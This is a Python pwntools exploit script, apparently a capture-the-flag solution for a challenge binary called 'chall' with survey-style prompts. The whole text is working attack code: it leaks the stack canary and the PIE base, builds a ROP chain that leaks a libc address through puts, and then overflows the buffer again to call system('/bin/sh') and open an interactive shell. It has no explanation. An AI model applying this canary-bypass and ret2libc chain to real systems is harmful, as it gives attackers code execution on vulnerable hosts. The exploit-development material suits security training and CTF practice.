from pwn import *
from six import b

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_debug = False if "remote" in sys.argv else True

vuln_name = "./chall"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_name), ROP(vuln_name)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if f_debug:
    io = process(vuln_name)
else:
    io = remote("", 1111)


def ddebug():
    gdb.attach(io)
    pause()


# canary
io.sendlineafter("Do you want to complete a survey?\n", "y")
io.sendafter("ctf?\n", "a" * 10 + "b")
io.recvuntil('b')
canary = u64(b"\00" + io.recv(7))
success("canary -> " + hex(canary))
io.sendafter("feedback?\n", b"a" * 10 + p64(canary))

# pie leak
io.sendlineafter("Do you want to complete a survey?\n", "y")
io.sendafter("ctf?\n", b"a" * 10 + b"a" * 8 + b"b" * 7 + b"c")
io.recvuntil("c")
elf.address = u64(io.recv(6).ljust(8, b"\x00")) - 55 - elf.symbols["main"]
success("elf.address -> " + hex(elf.address))

# libc
pop_rdi = elf.address + 0x14d3
payload = b"a" * 10 + p64(canary)
payload += b"f" * 8
payload += p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])
io.sendafter("feedback?\n", payload)
libcputs_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = libcputs_offset - libc.symbols["puts"]
success("libc address -> " + hex(libc.address))

# system
io.sendlineafter("Do you want to complete a survey?\n", "y")
io.sendafter("ctf?\n", "a")
ret = elf.address + 0x101a
payload = b"a" * 10 + p64(canary)
payload += b"f" * 8
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)
payload += p64(libc.symbols["system"])
io.sendafter("feedback?\n", payload)

io.interactive()
